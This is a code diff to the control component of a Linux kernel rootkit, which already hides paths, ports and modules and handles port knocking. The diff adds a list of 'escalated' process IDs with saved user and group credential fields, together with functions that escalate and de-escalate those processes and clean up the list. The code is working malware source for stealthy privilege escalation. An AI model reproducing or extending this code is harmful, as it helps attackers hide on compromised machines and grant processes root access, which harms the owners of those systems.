@@ -14,6 +14,7 @@ static struct list_head tcp_sockets;
 static struct list_head udp_sockets;
 static struct list_head modules;
 static struct list_head port_knocking_enabled;
+static struct list_head escalated_pids;
 
 int
 is_path_hidden(char *name)
@@ -441,6 +442,72 @@ unfilter_port(int port, int protocol)
 	return -EINVAL;
 }
 
+struct escalated_pid *
+is_shell_escalated(pid_t pid)
+{
+	struct  escalated_pid *cur;
+	struct list_head *cursor;
+
+	if(pid == 0) {
+		return NULL;
+	}
+		
+	list_for_each(cursor, &escalated_pids) {
+		cur = list_entry(cursor, struct escalated_pid, list);
+		if(cur->pid == pid) {
+			return cur;
+		}
+	}
+	return NULL;
+}
+
+int 
+escalate(struct escalated_pid *id)
+{
+	struct escalated_pid *new;
+	
+	if(!is_shell_escalated(id->pid))
+	{
+		new = kmalloc(sizeof(struct escalated_pid), GFP_KERNEL);
+		
+		if(new == NULL) {
+			return -ENOMEM;
+		}	
+		
+		new->pid = id->pid;
+		
+		new->uid   = id->uid;
+		new->euid  = id->euid;
+		new->suid  = id->suid;
+		new->fsuid = id->fsuid;
+		new->gid   = id->gid;
+		new->egid  = id->egid;
+		new->sgid  = id->sgid;
+		new->fsgid = id->fsgid;
+		
+		list_add(&new->list, &escalated_pids);
+	}
+	return 0;
+}
+
+int 
+deescalate(pid_t pid)
+{
+	
+	struct escalated_pid *cur;
+	struct list_head *cursor, *next;
+	
+	list_for_each_safe(cursor, next, &escalated_pids) {
+		cur = list_entry(cursor, struct escalated_pid, list);
+		if(cur->pid == pid) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+	return -EINVAL;
+}
+
 void
 initialize_control(void)
 {
@@ -453,7 +520,7 @@ initialize_control(void)
 	INIT_LIST_HEAD(&udp_sockets);
 	INIT_LIST_HEAD(&modules);
 	INIT_LIST_HEAD(&port_knocking_enabled);
-
+	INIT_LIST_HEAD(&escalated_pids);
 	ROOTKIT_DEBUG("Done.\n");
 }
 
@@ -470,7 +537,8 @@ cleanup_control(void)
 	struct udp_socket *udp;
 	struct modules *module;
 	struct port_knocking *knocked_port;
-	
+	struct escalated_pid *esc_pid;
+		
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &paths) {
 		name = list_entry(cursor, struct file_name, list);
@@ -518,6 +586,13 @@ cleanup_control(void)
 		knocked_port = list_entry(cursor, struct port_knocking, list);
 		list_del(cursor);
 		kfree(knocked_port);
+	}
+	
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &escalated_pids) {
+		esc_pid = list_entry(cursor, struct escalated_pid, list);
+		list_del(cursor);
+		kfree(esc_pid);
 	}
 
 	ROOTKIT_DEBUG("Done.\n");
